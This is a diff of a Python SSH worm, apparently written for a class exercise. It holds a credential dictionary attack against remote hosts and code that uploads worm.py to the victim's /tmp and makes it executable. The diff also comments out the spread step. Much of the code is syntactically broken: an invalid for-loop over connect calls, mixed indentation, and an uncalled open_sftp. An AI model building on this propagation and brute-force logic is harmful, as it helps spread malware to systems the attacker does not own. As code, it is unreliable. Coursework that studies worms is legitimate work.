@@ -58,18 +58,18 @@ def spreadAndExecute(sshClient):
 	# code we used for an in-class exercise.
 	# The code which goes into this function
 	# is very similar to that code.	
-	pass
-    ssh = paramiko.SSHClient()
     
-    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        ssh = paramiko.SSHClient()
     
-    for (ssh.connect(sshClient, username, password)) in credList:
+   # ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     
-    sftpClient = ssh.open_sftp()
+   # for (ssh.connect(sshClient, username, password)) in credList:
     
-    sftpClient.put("worm.py", "/tmp/" + "worm.py")
+   # sftpClient = ssh.open_sftp()
     
-    ssh.exec_command("chmod a+x /tmp/worm.py")
+   # sftpClient.put("worm.py", "/tmp/" + "worm.py")
+    
+   # ssh.exec_command("chmod a+x /tmp/worm.py")
  
 
 
@@ -106,17 +106,17 @@ def tryCredentials(host, userName, password, sshClient):
 	# declaration (if you choose to use
 	# this skeleton).
  
-    print("Try to connect to host host using username and password")
-	try:
-        sshClient.connect(host, userName, password)
-        print("Opened a connectin to the victim's system!")
-        sftpClient = sshClient.open_sftp
-    except paramiko.SSHException
-        print("Wrong credentials :(")
-        return 1
-    except socket.error
-        print("Server is down or has some other problem")
-        return 3
+        print("Try to connect to host host using username and password")
+    	try:
+             sshClient.connect(host, userName, password)
+             print("Opened a connectin to the victim's system!")
+             sftpClient = sshClient.open_sftp
+        except paramiko.SSHException:
+             print("Wrong credentials :(")
+             return 1
+        except socket.error:
+             print("Server is down or has some other problem")
+             return 3
 
 ###############################################################
 # Wages a dictionary attack against the host
@@ -154,8 +154,8 @@ def attackSystem(host):
 		# instance of the SSH connection
 		# to the remote system. 
 		if(0 == tryCredentials(host, username, password)):
-                print("Successfully compromised the system, it returned 0")
-                return(ssh, username, password)
+                     print("Successfully compromised the system, it returned 0")
+                     return(ssh, username, password)
 			
 	# Could not find working credentials
 	return None	
@@ -171,8 +171,8 @@ def getMyIP(interface):
 	# TODO: Change this to retrieve and
 	# return the IP of the current system.
  
-    # The IP address
-    ipAddr = None
+        # The IP address
+        ipAddr = None
  
         # Go through all the interfaces
         for netFace in interface:
